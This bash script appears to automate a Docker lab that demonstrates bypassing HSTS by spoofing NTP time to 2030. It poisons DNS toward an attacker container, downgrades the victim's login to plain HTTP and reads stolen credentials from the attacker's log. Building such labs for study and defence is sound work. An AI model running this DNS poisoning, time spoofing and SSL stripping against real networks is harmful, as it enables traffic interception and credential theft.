#!/bin/bash
# â³ NTP-HSTS Temporal Bypass: Automated Lab Script (Linux Robust)

# Define colors for output
CYAN='\033[0;36m'
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
MAGENTA='\033[0;35m'
NC='\033[0m' # No Color

echo -e "${CYAN}[-] Starting Lab Setup...${NC}"

# 1. Setup & Certificates
echo -e "${YELLOW}[-] Generating Self-Signed Certificates...${NC}"
mkdir -p ./webserver/certs
# We use standard docker run to generate certs using Alpine
docker run --rm -v "${PWD}/webserver:/work" -w /work alpine /bin/sh -c \
    "apk add --no-cache openssl && mkdir -p certs && openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout certs/server.key -out certs/server.crt -subj '/C=US/ST=Test/L=Test/O=Test/CN=secure.test' 2>/dev/null"

# 2. Build and Start
echo -e "${YELLOW}[-] Building and Starting Containers...${NC}"
docker-compose down > /dev/null 2>&1
docker-compose up -d --build

# ---------------------------------------------------------
# PROVISIONING CHECK
# ---------------------------------------------------------
echo -e "\n${YELLOW}[-] Waiting for Victim Container to finish installing tools...${NC}"
MAX_RETRIES=40
RETRY_COUNT=0
PROVISIONED=false

while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
    sleep 5
    if docker exec victim-client which curl > /dev/null 2>&1; then
        PROVISIONED=true
        echo -e "${GREEN} [OK] Tools installed!${NC}"
        break
    else
        ((RETRY_COUNT++))
        echo -n " ... still installing ($RETRY_COUNT/$MAX_RETRIES)"
    fi
done

if [ "$PROVISIONED" = false ]; then
    echo -e "\n${RED}[!] Critical Error: Victim container failed to install tools (curl). Check internet connection.${NC}"
    exit 1
fi

# ---------------------------------------------------------
# Phase 1: The "Safe" State (Year 2026)
# ---------------------------------------------------------
echo -e "\n${MAGENTA}[Phase 1] Establishing HSTS Trust (Year 2026)...${NC}"
echo "[-] Victim connecting to Real Server..."

# Force connection to Real Server (172.20.0.10)
# Capturing output to variable
P1_OUTPUT=$(docker exec victim-client curl -v -k --resolve secure.test:443:172.20.0.10 --hsts /hsts.txt https://secure.test/login -d "username=admin&password=SafePassword" 2>&1)

if echo "$P1_OUTPUT" | grep -q "HTTP/1.1 200"; then
    echo -e "${GREEN}[-] Login Successful. HSTS Policy Cached.${NC}"
else
    echo -e "${RED}[!] Phase 1 Failed. Output:${NC}"
    echo "$P1_OUTPUT"
fi

# ---------------------------------------------------------
# Phase 2: Setting the Trap (DNS Poisoning)
# ---------------------------------------------------------
echo -e "\n${MAGENTA}[Phase 2] Poisoning DNS & Testing HSTS Protection...${NC}"
# Point DNS to Attacker (172.20.0.5)
docker exec attacker-mitm sed -i 's/172.20.0.10/172.20.0.5/' /etc/dnsmasq.conf
docker restart attacker-mitm
sleep 5

echo "[-] Attempting Connection with Poisoned DNS (Should FAIL)..."
P2_OUTPUT=$(docker exec victim-client curl -v -k -L --hsts /hsts.txt https://secure.test/login -d "user=admin&password=ThisShouldBeSafe" 2>&1)

if echo "$P2_OUTPUT" | grep -E "Connection refused|Failed to connect|SSL_connect"; then
    echo -e "${GREEN}[-] Connection Refused! HSTS correctly blocked the attack.${NC}"
else
    echo -e "${YELLOW}[!] Warning: Connection didn't fail as expected. Output:${NC}"
    # echo "$P2_OUTPUT" # Uncomment to debug
fi

# ---------------------------------------------------------
# Phase 3: The Temporal Attack (Year 2030)
# ---------------------------------------------------------
echo -e "\n${MAGENTA}[Phase 3] Launching NTP Spoofing (Shifting to 2030)...${NC}"

# Start the date-shift loop in the background on the attacker
docker exec -d attacker-mitm sh -c "while true; do date -s '2030-01-01 12:00:00'; sleep 1; done"

echo "[-] Waiting for Victim to Sync Time..."
MAX_Sync_RETRIES=30
for ((i=1; i<=MAX_Sync_RETRIES; i++)); do
    # Force sync
    docker exec victim-client ntpdate -u 172.20.0.5 > /dev/null 2>&1
    CURRENT_DATE=$(docker exec victim-client date)
    
    if [[ "$CURRENT_DATE" == *"2030"* ]]; then
        echo -e "${GREEN}[-] Time Shift Successful: $CURRENT_DATE${NC}"
        break
    fi
    sleep 2
done

# ---------------------------------------------------------
# Phase 4: Exploit & Compromise
# ---------------------------------------------------------
echo -e "\n${MAGENTA}[Phase 4] Executing SSL Stripping & Credential Theft...${NC}"
echo "[-] Victim connecting via HTTP (HSTS Expired)..."

# Connect via HTTP
P4_OUTPUT=$(docker exec victim-client curl -v -k -L --hsts /hsts.txt http://secure.test/login -d "user=admin&password=ThisShouldBeSafe" 2>&1)

if echo "$P4_OUTPUT" | grep -E "HTTP/1.1 200|302 Found"; then
    echo -e "${GREEN}[-] Connection Downgraded & Successful.${NC}"
else
    echo -e "${YELLOW}[!] Connection Warning. Output:${NC}"
fi

echo -e "\n${CYAN}[+] Checking Attacker Logs...${NC}"
LOGS=$(docker exec attacker-mitm cat /var/log/nginx/creds.log)

if [[ -n "$LOGS" ]]; then
    echo -e "${RED}$LOGS${NC}"
    echo -e "\n${CYAN}[***] EXPLOIT SUCCESSFUL [***]${NC}"
else
    echo -e "${RED}[!] No credentials found in log yet.${NC}"
fi

echo -e "\n[-] Lab Complete."